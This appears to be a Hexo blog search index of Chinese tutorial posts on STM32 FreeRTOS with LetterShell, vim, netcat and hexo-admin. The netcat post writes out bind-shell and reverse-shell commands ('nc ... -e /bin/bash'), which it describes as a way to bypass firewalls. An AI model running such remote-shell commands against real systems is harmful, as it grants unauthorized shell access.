userShellRead;    shell.lock = userShellLock;    shell.unlock = userShellUnlock;    shellInit(&shell, shellBuffer, 512);    xTaskCreate(shellTask, "shell", 256, &shell, 5, NULL);&#125;CEVENT_EXPORT(EVENT_INIT_STAGE2, userShellInit);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>4.在freertos.c里导入shell_port.h头文件</li><li>5.配置中断回调函数和调用userShellInit()函数，整体文件代码如下</li></ul><pre class="line-numbers language-lang-c"><code class="language-lang-c">/* USER CODE BEGIN Header *//**  ******************************************************************************  * File Name          : freertos.c  * Description        : Code for freertos applications  ******************************************************************************  * @attention  *  * Copyright (c) 2024 STMicroelectronics.  * All rights reserved.  *  * This software is licensed under terms that can be found in the LICENSE file  * in the root directory of this software component.  * If no LICENSE file comes with this software, it is provided AS-IS.  *  ******************************************************************************  *//* USER CODE END Header *//* Includes ------------------------------------------------------------------*/#include "FreeRTOS.h"#include "task.h"#include "main.h"#include "cmsis_os.h"/* Private includes ----------------------------------------------------------*//* USER CODE BEGIN Includes */#include "shell_port.h"#include "usart.h"/* USER CODE END Includes *//* Private typedef -----------------------------------------------------------*//* USER CODE BEGIN PTD */uint8_t recv_buf = 0;/* USER CODE END PTD *//* Private define ------------------------------------------------------------*//* USER CODE BEGIN PD */int LED_ON(int Time);/* USER CODE END PD *//* Private macro -------------------------------------------------------------*//* USER CODE BEGIN PM *//* USER CODE END PM *//* Private variables ---------------------------------------------------------*//* USER CODE BEGIN Variables *//* USER CODE END Variables *//* Definitions for defaultTask */osThreadId_t defaultTaskHandle;const osThreadAttr_t defaultTask_attributes = &#123;  .name = "defaultTask",  .stack_size = 128 * 4,  .priority = (osPriority_t) osPriorityNormal,&#125;;/* Definitions for myTask02 */osThreadId_t myTask02Handle;const osThreadAttr_t myTask02_attributes = &#123;  .name = "myTask02",  .stack_size = 128 * 4,  .priority = (osPriority_t) osPriorityNormal,&#125;;/* Private function prototypes -----------------------------------------------*//* USER CODE BEGIN FunctionPrototypes *//* USER CODE END FunctionPrototypes */void StartDefaultTask(void *argument);void StartTask02(void *argument);void MX_FREERTOS_Init(void); /* (MISRA C 2004 rule 8.1) *//**  * @brief  FreeRTOS initialization  * @param  None  * @retval None  */void MX_FREERTOS_Init(void) &#123;  /* USER CODE BEGIN Init */  /* USER CODE END Init */  /* USER CODE BEGIN RTOS_MUTEX */  /* add mutexes, ... */  /* USER CODE END RTOS_MUTEX */  /* USER CODE BEGIN RTOS_SEMAPHORES */  /* add semaphores, ... */  /* USER CODE END RTOS_SEMAPHORES */  /* USER CODE BEGIN RTOS_TIMERS */  /* start timers, add new ones, ... */  /* USER CODE END RTOS_TIMERS */  /* USER CODE BEGIN RTOS_QUEUES */  /* add queues, ... */  /* USER CODE END RTOS_QUEUES */  /* Create the thread(s) */  /* creation of defaultTask */  defaultTaskHandle = osThreadNew(StartDefaultTask, NULL, &defaultTask_attributes);  /* creation of myTask02 */  myTask02Handle = osThreadNew(StartTask02, NULL, &myTask02_attributes);  /* USER CODE BEGIN RTOS_THREADS */  /* add threads, ... */  /* USER CODE END RTOS_THREADS */  /* USER CODE BEGIN RTOS_EVENTS */  /* add events, ... */  /* USER CODE END RTOS_EVENTS */&#125;/* USER CODE BEGIN Header_StartDefaultTask *//**  * @brief  Function implementing the defaultTask thread.  * @param  argument: Not used  * @retval None  *//* USER CODE END Header_StartDefaultTask */void StartDefaultTask(void *argument)&#123;  /* USER CODE BEGIN StartDefaultTask */    userShellInit();    HAL_UART_Receive_IT(&huart1, (uint8_t*)&recv_buf, 1);    while(1)    &#123;    &#125;  /* USER CODE END StartDefaultTask */&#125;/* USER CODE BEGIN Header_StartTask02 *//*** @brief Function implementing the myTask02 thread.* @param argument: Not used* @retval None*//* USER CODE END Header_StartTask02 */void StartTask02(void *argument)&#123;  /* USER CODE BEGIN StartTask02 */    while(1)    &#123;    &#125;  /* USER CODE END StartTask02 */&#125;/* Private application code --------------------------------------------------*//* USER CODE BEGIN Application */int LED_ON(int Time)&#123;    HAL_GPIO_WritePin(LED2_GPIO_Port, LED2_Pin, GPIO_PIN_SET);    HAL_Delay(Time);    HAL_GPIO_WritePin(LED2_GPIO_Port, LED2_Pin, GPIO_PIN_RESET);    return 0;&#125;SHELL_EXPORT_CMD(SHELL_CMD_PERMISSION(0)|SHELL_CMD_TYPE(SHELL_TYPE_CMD_FUNC), LED_ON, LED_ON, LED_ON);void HAL_UART_RxCpltCallback(UART_HandleTypeDef *huart)&#123;    /* 判断是哪个串口触发的中断 */    if(huart ->Instance == USART1)    &#123;        //调用shell处理数据的接收              shellHandler(&shell, recv_buf);        //使能串口中断接收              HAL_UART_Receive_IT(&huart1, (uint8_t*)&recv_buf, 1);    &#125;&#125;/* USER CODE END Application */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>1.在实现LED闪烁会调用HAL_Delay()函数要注意它的中断优先级。防止延迟函数卡死。</p><p>2.头文件的导入</p><p>3.配置uart中断回调函数</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>本教程由于时间问题所以比较粗略，请谅解。您可以在我的<a href="https://github.com/haclm/STM32_lettershell_FreeRTOS">GitHub</a>上找到完整代码。感谢您的观看！谢谢！</p>]]></content>
      
      
      
        <tags>
            
            <tag> STM32 </tag>
            
            <tag> FreeRTOS </tag>
            
            <tag> LetterShell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识FreeRTOS</title>
      <link href="/2024/03243229.html"/>
      <url>/2024/03243229.html</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>FreeRTOS 是市场领先的面向微控制器和小型微处理器的实时操作系统。</p><p><a href="https://www.freertos.org/zh-cn-cmn-s/">官网</a></p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h2><p>本教程软件用的时STM32CubeIDE并且用的是HAL库函数和</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>1.打开STM32CubeIDE软件</p><p>2.点击File 然后new 接着STM32 project</p><p><img src="/images/stm32cubeide_new.png" alt="upload successful"><br>3.选择对应型号的MCU，我这边使用的是STM32l053R8T6。然后点击Next。后填写项目名和项目所在的位置。</p><p>4.点击按键生成</p><p>5.配置</p><p><img src="/images/STM32RTOS_Config.png" alt="upload successful"><br>先配置时钟点击Clock Configuration这点用过Cube的都知道就不赘述了。</p><p>配置GPIO 本教程用两个GPIO输出分别是PA5与PA6。通过示波器观察GPIO的信号更能直观的看到任务执行。</p><p>配置FreeRTOS  点击Middleware and Software Packs 后选择 FREERTOS<br>因为本教程用的是CMSIS_V1所有interface选择CMSIS_V1。下面的Configuration可以设置一些基本参数。</p><p>6.项目配置<br>点击Project Manage后选择Code Generator 勾选 Generate peripheral initalization as a pair of ‘.c/.h’file per peripheral</p><p>7.项目代码生成</p><p><img src="/images/STM32build.png" alt="upload successful"><br>点击第一个小灯泡即可生成代码</p><h2 id="代码修改"><a href="#代码修改" class="headerlink" title="代码修改"></a>代码修改</h2><p>首先阅览main.c文件看一下程序流程</p><pre class="line-numbers language-lang-c"><code class="language-lang-c">int main(void)&#123;  /* USER CODE BEGIN 1 */  /* USER CODE END 1 */  /* MCU Configuration--------------------------------------------------------*/  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */  HAL_Init();  /* USER CODE BEGIN Init */  /* USER CODE END Init */  /* Configure the system clock */  SystemClock_Config();  /* USER CODE BEGIN SysInit */  /* USER CODE END SysInit */  /* Initialize all configured peripherals */  MX_GPIO_Init();  /* USER CODE BEGIN 2 */  /* USER CODE END 2 */  /* Call init function for freertos objects (in freertos.c) */  MX_FREERTOS_Init();  /* Start scheduler */  osKernelStart();  /* We should never get here as control is now taken by the scheduler */  /* Infinite loop */  /* USER CODE BEGIN WHILE */  while (1)  &#123;    /* USER CODE END WHILE */    /* USER CODE BEGIN 3 */  &#125;  /* USER CODE END 3 */&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>里面有一个名为MX_FREERTOS_Init();的函数，可以鼠标选中F3进去看看</p><pre class="line-numbers language-lang-c"><code class="language-lang-c">/* USER CODE BEGIN Header *//**  ******************************************************************************  * File Name          : freertos.c  * Description        : Code for freertos applications  ******************************************************************************  * @attention  *  * Copyright (c) 2024 STMicroelectronics.  * All rights reserved.  *  * This software is licensed under terms that can be found in the LICENSE file  * in the root directory of this software component.  * If no LICENSE file comes with this software, it is provided AS-IS.  *  ******************************************************************************  *//* USER CODE END Header *//* Includes ------------------------------------------------------------------*/#include "FreeRTOS.h"#include "task.h"#include "main.h"#include "cmsis_os.h"/* Private includes ----------------------------------------------------------*//* USER CODE BEGIN Includes *//* USER CODE END Includes *//* Private typedef -----------------------------------------------------------*//* USER CODE BEGIN PTD *//* USER CODE END PTD *//* Private define ------------------------------------------------------------*//* USER CODE BEGIN PD *//* USER CODE END PD *//* Private macro -------------------------------------------------------------*//* USER CODE BEGIN PM *//* USER CODE END PM *//* Private variables ---------------------------------------------------------*//* USER CODE BEGIN Variables *//* USER CODE END Variables */osThreadId defaultTaskHandle;/* Private function prototypes -----------------------------------------------*//* USER CODE BEGIN FunctionPrototypes *//* USER CODE END FunctionPrototypes */void StartDefaultTask(void const * argument);void MX_FREERTOS_Init(void); /* (MISRA C 2004 rule 8.1) *//* GetIdleTaskMemory prototype (linked to static allocation support) */void vApplicationGetIdleTaskMemory( StaticTask_t **ppxIdleTaskTCBBuffer, StackType_t **ppxIdleTaskStackBuffer, uint32_t *pulIdleTaskStackSize );/* USER CODE BEGIN GET_IDLE_TASK_MEMORY */static StaticTask_t xIdleTaskTCBBuffer;static StackType_t xIdleStack[configMINIMAL_STACK_SIZE];void vApplicationGetIdleTaskMemory( StaticTask_t **ppxIdleTaskTCBBuffer, StackType_t **ppxIdleTaskStackBuffer, uint32_t *pulIdleTaskStackSize )&#123;  *ppxIdleTaskTCBBuffer = &xIdleTaskTCBBuffer;  *ppxIdleTaskStackBuffer = &xIdleStack[0];  *pulIdleTaskStackSize = configMINIMAL_STACK_SIZE;  /* place for user code */&#125;/* USER CODE END GET_IDLE_TASK_MEMORY *//**  * @brief  FreeRTOS initialization  * @param  None  * @retval None  */void MX_FREERTOS_Init(void) &#123;  /* USER CODE BEGIN Init */  /* USER CODE END Init */  /* USER CODE BEGIN RTOS_MUTEX */  /* add mutexes, ... */  /* USER CODE END RTOS_MUTEX */  /* USER CODE BEGIN RTOS_SEMAPHORES */  /* add semaphores, ... */  /* USER CODE END RTOS_SEMAPHORES */  /* USER CODE BEGIN RTOS_TIMERS */  /* start timers, add new ones, ... */  /* USER CODE END RTOS_TIMERS */  /* USER CODE BEGIN RTOS_QUEUES */  /* add queues, ... */  /* USER CODE END RTOS_QUEUES */  /* Create the thread(s) */  /* definition and creation of defaultTask */  osThreadDef(defaultTask, StartDefaultTask, osPriorityNormal, 0, 128);  defaultTaskHandle = osThreadCreate(osThread(defaultTask), NULL);  /* USER CODE BEGIN RTOS_THREADS */  /* add threads, ... */  /* USER CODE END RTOS_THREADS */&#125;/* USER CODE BEGIN Header_StartDefaultTask *//**  * @brief  Function implementing the defaultTask thread.  * @param  argument: Not used  * @retval None  *//* USER CODE END Header_StartDefaultTask */void StartDefaultTask(void const * argument)&#123;  /* USER CODE BEGIN StartDefaultTask */  /* Infinite loop */  for(;;)  &#123;    osDelay(1);  &#125;  /* USER CODE END StartDefaultTask */&#125;/* Private application code --------------------------------------------------*//* USER CODE BEGIN Application *//* USER CODE END Application */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>里面函数执行了两个语句。</p><pre class="line-numbers language-lang-c"><code class="language-lang-c">osThreadDef(defaultTask, StartDefaultTask, osPriorityNormal, 0, 128);defaultTaskHandle = osThreadCreate(osThread(defaultTask), NULL);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>一个是任务的定义一个是任务的创立。<br>后有一个名为StartDefulatTask函数里面的语句就是该任务执行的语句功能。所以修改它就可以改变该任务的功能<br>往上看创建一个任务先要用osThreadId 定义一个任务的handle</p><p>创建要实现对应功能的函数</p><p>然后用osThreadDef函数定义任务的名称(name) 线程(thread就是要实现功能的函数) 优先权(priority) 可能的线程实例数(instances) 栈的大小(stacksz)</p><p>后用osThreadCreat()函数创建任务并用任务Handle接受返回值</p><p>了解这些就可以实现俩个任务”同时”运行了</p><p>修改后代码如下</p><pre class="line-numbers language-lang-c"><code class="language-lang-c">/* USER CODE BEGIN Header *//**  ******************************************************************************  * File Name          : freertos.c  * Description        : Code for freertos applications  ******************************************************************************  * @attention  *  * Copyright (c) 2024 STMicroelectronics.  * All rights reserved.  *  * This software is licensed under terms that can be found in the LICENSE file  * in the root directory of this software component.  * If no LICENSE file comes with this software, it is provided AS-IS.  *  ******************************************************************************  *//* USER CODE END Header *//* Includes ------------------------------------------------------------------*/#include "FreeRTOS.h"#include "task.h"#include "main.h"#include "cmsis_os.h"/* Private includes ----------------------------------------------------------*//* USER CODE BEGIN Includes *//* USER CODE END Includes *//* Private typedef -----------------------------------------------------------*//* USER CODE BEGIN PTD *//* USER CODE END PTD *//* Private define ------------------------------------------------------------*//* USER CODE BEGIN PD *//* USER CODE END PD *//* Private macro -------------------------------------------------------------*//* USER CODE BEGIN PM *//* USER CODE END PM *//* Private variables ---------------------------------------------------------*//* USER CODE BEGIN Variables *//* USER CODE END Variables */osThreadId defaultTaskHandle;osThreadId LEDTaskHandle;/* Private function prototypes -----------------------------------------------*//* USER CODE BEGIN FunctionPrototypes *//* USER CODE END FunctionPrototypes */void StartDefaultTask(void const * argument);void StartLEDTask(void const * argument);void MX_FREERTOS_Init(void); /* (MISRA C 2004 rule 8.1) *//* GetIdleTaskMemory prototype (linked to static allocation support) */void vApplicationGetIdleTaskMemory( StaticTask_t **ppxIdleTaskTCBBuffer, StackType_t **ppxIdleTaskStackBuffer, uint32_t *pulIdleTaskStackSize );/* USER CODE BEGIN GET_IDLE_TASK_MEMORY */static StaticTask_t xIdleTaskTCBBuffer;static StackType_t xIdleStack[configMINIMAL_STACK_SIZE];void vApplicationGetIdleTaskMemory( StaticTask_t **ppxIdleTaskTCBBuffer, StackType_t **ppxIdleTaskStackBuffer, uint32_t *pulIdleTaskStackSize )&#123;  *ppxIdleTaskTCBBuffer = &xIdleTaskTCBBuffer;  *ppxIdleTaskStackBuffer = &xIdleStack[0];  *pulIdleTaskStackSize = configMINIMAL_STACK_SIZE;  /* place for user code */&#125;/* USER CODE END GET_IDLE_TASK_MEMORY *//**  * @brief  FreeRTOS initialization  * @param  None  * @retval None  */void MX_FREERTOS_Init(void) &#123;  /* USER CODE BEGIN Init */  /* USER CODE END Init */  /* USER CODE BEGIN RTOS_MUTEX */  /* add mutexes, ... */  /* USER CODE END RTOS_MUTEX */  /* USER CODE BEGIN RTOS_SEMAPHORES */  /* add semaphores, ... */  /* USER CODE END RTOS_SEMAPHORES */  /* USER CODE BEGIN RTOS_TIMERS */  /* start timers, add new ones, ... */  /* USER CODE END RTOS_TIMERS */  /* USER CODE BEGIN RTOS_QUEUES */  /* add queues, ... */  /* USER CODE END RTOS_QUEUES */  /* Create the thread(s) */  /* definition and creation of defaultTask */  osThreadDef(defaultTask, StartDefaultTask, osPriorityNormal, 0, 128);  defaultTaskHandle = osThreadCreate(osThread(defaultTask), NULL);  osThreadDef(LEDTask, StartLEDTask,osPriorityNormal,0,128);  LEDTaskHandle = osThreadCreate(osThread(LEDTask), NULL);  /* USER CODE BEGIN RTOS_THREADS */  /* add threads, ... */  /* USER CODE END RTOS_THREADS */&#125;/* USER CODE BEGIN Header_StartDefaultTask *//**  * @brief  Function implementing the defaultTask thread.  * @param  argument: Not used  * @retval None  *//* USER CODE END Header_StartDefaultTask */void StartDefaultTask(void const * argument)&#123;  /* USER CODE BEGIN StartDefaultTask */  /* Infinite loop */  for(;;)  &#123;      HAL_GPIO_TogglePin(LED1_GPIO_Port, LED1_Pin);    osDelay(100);  &#125;  /* USER CODE END StartDefaultTask */&#125;void StartLEDTask(void const * argument)&#123;    for(;;)    &#123;        HAL_GPIO_TogglePin(LED2_GPIO_Port, LED2_Pin);        osDelay(100);    &#125;&#125;/* Private application code --------------------------------------------------*//* USER CODE BEGIN Application *//* USER CODE END Application */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果如下</p><p><img src="/images/STM32twotaskb.png" alt="upload successful"><br><img src="/images/STM32twotask.png" alt="upload successful"><br>可以看出两个任务在”同时”运行</p>]]></content>
      
      
      <categories>
          
          <category> 嵌入式 </category>
          
          <category> FreeRTOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STM32 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim</title>
      <link href="/2021/090426382.html"/>
      <url>/2021/090426382.html</url>
      
        <content type="html"><![CDATA[<h1 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h1><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>vim是什么？vim是古老的编辑器。那vim都很古老了为什么要来介绍？你要记住vim编辑器很强！</p><h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><p>一般linux都自带vim编辑器，如果你的linux没有安装那就安装一下。</p><p><pre><code>sudo apt-get install vim</code></pre></p><h2 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h2><h3 id="编辑一个文件："><a href="#编辑一个文件：" class="headerlink" title="编辑一个文件："></a>编辑一个文件：</h3><p>以a.c为例子</p><p><pre><code>vim a.c</code></pre></p><h3 id="键盘技巧："><a href="#键盘技巧：" class="headerlink" title="键盘技巧："></a>键盘技巧：</h3><p><img src="/images/pasted-21.png" alt="upload successful"><br>使用这些快捷键是在普通模式下，并不是在输入模式下。退出输入模式按键盘左上角的Esc键。</p><h3 id="“-”用法："><a href="#“-”用法：" class="headerlink" title="“:”用法："></a>“:”用法：</h3><p>保存：在普通模式输入英文的这个符号”:” ，再输入w。最后回车。(:w)<br><br>退出：在普通模式输入英文的这个符号”:”,在输入q。最后回车。(:q)<br><br>保存并退出：跟上面差不多，可以缩写。(:wq)<br><br>移动行数：在普通模式输入英文的这个符号”:”,在输入行数。最后回车。(以移动到行数1位例子:1)<br></p><h3 id="查找字符："><a href="#查找字符：" class="headerlink" title="查找字符："></a>查找字符：</h3><p>在普通模式输入英文的这个符号”?”,再输入要查找的字符。最后回车。(以查找include为例子?include)</p><h2 id="结言："><a href="#结言：" class="headerlink" title="结言："></a>结言：</h2><p>vim的功能和强大之处还有很多，本期就介绍这么多。<br>如果你喜欢我博文的话，就订阅我的srr吧！欢迎打赏请作者喝一杯冰可乐吧！</p>]]></content>
      
      
      <categories>
          
          <category> kali linux </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编辑器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>netcat</title>
      <link href="/2021/080857223.html"/>
      <url>/2021/080857223.html</url>
      
        <content type="html"><![CDATA[<h1 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h1><h2 id="netcat的简介"><a href="#netcat的简介" class="headerlink" title="netcat的简介"></a>netcat的简介</h2><p>netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，可以在脚本中以多种方式使用它。</p><h2 id="netcat的安装"><a href="#netcat的安装" class="headerlink" title="netcat的安装"></a>netcat的安装</h2><h3 id="linux安装："><a href="#linux安装：" class="headerlink" title="linux安装："></a>linux安装：</h3><p><pre><code>sudo apt install netcat</code></pre></p><h3 id="windows安装："><a href="#windows安装：" class="headerlink" title="windows安装："></a>windows安装：</h3><p>点击这里<a href="https://eternallybored.org/misc/netcat/">netcat</a>下载netcat的文件和配置。</p><h4 id="windows配置："><a href="#windows配置：" class="headerlink" title="windows配置："></a>windows配置：</h4><p>进入下载netcat的目录，按住左shift+鼠标右键选择powershell输入：</p><p><pre><code>.\netcat</code></pre><br>当出现<code>Cmd line:</code>就配置成功，你可以配置环境变量点这里<a href="https://blog.csdn.net/BoomLee/article/details/102563472">怎么设置环境变量</a></p><h2 id="netcat的使用"><a href="#netcat的使用" class="headerlink" title="netcat的使用"></a>netcat的使用</h2><h3 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h3><p><pre><code>nc -z -v -n 127.0.0.1 21-25</code></pre><br>可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.<br>-z 参数告诉netcat使用0 IO,连接成功后立即关闭连接，不进行数据交换<br>-v 参数指使用冗余选项，即详细输出<br>-n 参数告诉netcat 不使用DNS解析，即仅仅是一串IP数字， 一般如果后面是跟IP数字的话，就带上-n参数；跟着是域名的话，就不带-n参数。</p><h3 id="聊天服务"><a href="#聊天服务" class="headerlink" title="聊天服务"></a>聊天服务</h3><p>服务端(ip=192.168.1.7)：<pre><code>nc -l -p 4444</code></pre>4444是开放的端口<br>客户端:<pre><code>nc 192.168.1.8</code></pre>192.168.1.7是服务端的IP地址<br>客户端和服务端是同一网端下!检测是否在同一网段可以采用互相ping ip<br>可以点击这里查看详细记录<a href="https://zhidao.baidu.com/question/69628323.html">百度教程</a></p><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>例子环境：</p><ul><li>A电脑ip:192.168.1.2</li><li>B电脑ip:192.168.1.3</li></ul><p>A电脑为服务端，B电脑为客户端。以a文件为要发送的文件。服务端要发送a文件到客户端，客户端则接受服务端发来的a文件。<br>A电脑命令如下：</p><p><pre><code>nc -l -p 4444 < a </code></pre><br>B电脑命令如下:</p><p><pre><code> nc 192.168.1.2 4444 > a</code></pre><br>反正则调换一下</p><h3 id="shell连接"><a href="#shell连接" class="headerlink" title="shell连接"></a>shell连接</h3><h4 id="1-正向连接"><a href="#1-正向连接" class="headerlink" title="1:正向连接"></a>1:正向连接</h4><h6 id="例子环境："><a href="#例子环境：" class="headerlink" title="例子环境："></a>例子环境：</h6><ul><li>A电脑ip:192.168.1.2</li><li>B电脑ip:192.168.1.3<h6 id="例子情况-用B电脑连接A电脑shell"><a href="#例子情况-用B电脑连接A电脑shell" class="headerlink" title="例子情况:用B电脑连接A电脑shell"></a>例子情况:用B电脑连接A电脑shell</h6></li><li>A电脑为服务端</li><li>B电脑为客户端<br>服务端命令如下：<br><pre><code>nc -l -p 4444 -e /bin/bash</code></pre><br>客户端命令如下：<br><pre><code>nc 192.168.1.2</code></pre><h4 id="2-反面连接-用于绕过防火墙"><a href="#2-反面连接-用于绕过防火墙" class="headerlink" title="2.反面连接(用于绕过防火墙)"></a>2.反面连接(用于绕过防火墙)</h4><h6 id="例子环境：-1"><a href="#例子环境：-1" class="headerlink" title="例子环境："></a>例子环境：</h6></li><li>A电脑ip:192.168.1.2</li><li>B电脑ip:192.168.1.3<h6 id="例子情况："><a href="#例子情况：" class="headerlink" title="例子情况："></a>例子情况：</h6></li><li>1.A机器连接B机器的shell，如果按照正向shell的做法，应该是把A当成netcat的客户端，把B当成netcat的服务端，在B上用-l参数监听输入的链接。</li><li>2.但是如果防火墙屏蔽了输入，只允许输出，那么这时候就是反向shell发挥作用的时候了。</li><li>3.反向shell的做法是把A当成netcat的客户端，把B当成netcat的客户端，然后在A上用-l参数监听netcat的链接。</li></ul><p>A电脑命令如下：</p><p><pre><code>nc -l -p 20000</code></pre><br>B电脑命令如下:</p><p><pre><code>nc 192.168.1.3 4444 -e /bin/bash</code></pre></p><h2 id="结言"><a href="#结言" class="headerlink" title="结言:"></a>结言:</h2><p>本博文是netcat的基础用法。欢迎订阅rss和打赏，请作者喝一杯冰可乐吧！</p>]]></content>
      
      
      <categories>
          
          <category> kali linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netcat </tag>
            
            <tag> 网络渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo admin写博客</title>
      <link href="/2021/080627682.html"/>
      <url>/2021/080627682.html</url>
      
        <content type="html"><![CDATA[<h1 id="hexo-admin写博客"><a href="#hexo-admin写博客" class="headerlink" title="hexo_admin写博客"></a>hexo_admin写博客</h1><p>写博客是不是很头疼？不好实时预览。用那黑乎乎的vim编辑器，看起来很头疼。那么我们不用vim编辑器用什么编辑器？用hexo admin！hexo admin编辑器可以实时预览对新手很好。告诉你一个秘密本博文也是用hexo admin写的！好了废话不多说了。let’s go.本教程用linux为例子，Windows的话也差不多万变不离其宗嘛</p><h2 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h2><ul><li>有hexo的电脑//电脑上没有安装hexo可以看上一期</li><li>电脑能联网 <h2 id="安装hexo-admin"><a href="#安装hexo-admin" class="headerlink" title="安装hexo admin"></a>安装hexo admin</h2>运行以下命令：<br><pre><code>cd blog && npm install hexo-admin --save</code></pre>    cd blog 是进入blog目录</li></ul><h2 id="运行："><a href="#运行：" class="headerlink" title="运行："></a>运行：</h2><p>运行以下命令来启动hexo_admin</p><pre><code>hexo s</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>进入<a href="hocalhost:4000/amdin">自己本地的博客</a><br><img src="/images/pasted-4.png" alt="filename already exists, renamed"><br>这个是设密码，输入内容后下滑，找到生成的代码，复制到blog目录’_config.yml’中保存并重启hexo，打来hexo-admin的界面。</p><h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><p>在posts 